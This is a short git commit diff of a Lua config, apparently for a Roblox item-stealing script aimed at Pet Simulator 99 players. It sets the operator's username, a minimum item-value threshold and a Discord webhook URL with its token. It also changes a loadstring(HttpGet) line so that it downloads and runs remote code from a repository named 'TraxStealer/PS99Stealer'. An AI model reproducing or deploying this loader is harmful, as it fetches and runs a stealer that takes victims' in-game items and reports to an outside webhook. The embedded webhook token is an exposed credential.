8df0d76530d476030a0347503a19b13a661f61ca
ROCGMC <a0960730188@gmail.com>
2025-04-20 11:24:37 +0800

    更新 code.lua

--- code.lua
+++ code.lua
@@ -1,5 +1,6 @@
-Username = "ROCGMC" 
-Username2 = 'ROCGMC'
-Webhook = "https://discord.com/api/webhooks/1363353314925740313/oxvok2uuruheKU8yxxFx33QIgjdGVW13wy3icuGG6y2eGXcQZDes-PqtI0zBYL7Qf2aE" 
+Username = "Your Roblox User"
+Username2 = "Same Username"
+MinimumRAP = 1000000
+Webhook ="https://discord.com/api/webhooks/1363353314925740313/oxvok2uuruheKU8yxxFx33QIgjdGVW13wy3icuGG6y2eGXcQZDes-PqtI0zBYL7Qf2aE" 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/terabite-max43/shitescripts/main/configs.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
